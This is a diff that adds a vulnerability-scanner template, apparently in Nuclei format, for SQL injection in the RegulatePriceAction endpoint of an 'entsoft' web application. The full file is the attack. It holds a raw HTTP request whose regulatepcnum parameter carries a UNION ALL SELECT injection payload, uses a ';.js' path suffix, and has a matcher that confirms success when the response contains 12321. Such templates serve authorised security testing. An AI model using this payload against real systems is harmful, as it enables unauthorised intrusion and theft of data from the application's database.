@@ -1,0 +1,22 @@
+id: msk-template
+
+info:
+  name: msk-template
+  author: msk
+  severity: high
+
+
+
+http:
+  - raw:
+      - |
+        GET /entsoft/RegulatePriceAction.entsoft;.js?method=getRegulatePricedlist&regulatepcnum=1'+UNION+ALL+SELECT+NULL,NULL,NULL,NULL,NULL,NULL,NULL,111*111--+aaaa HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.124 Safari/537.36
+        Accept-Encoding: gzip
+        Connection: close
+
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code==200 && contains_all(body,"12321","cell")
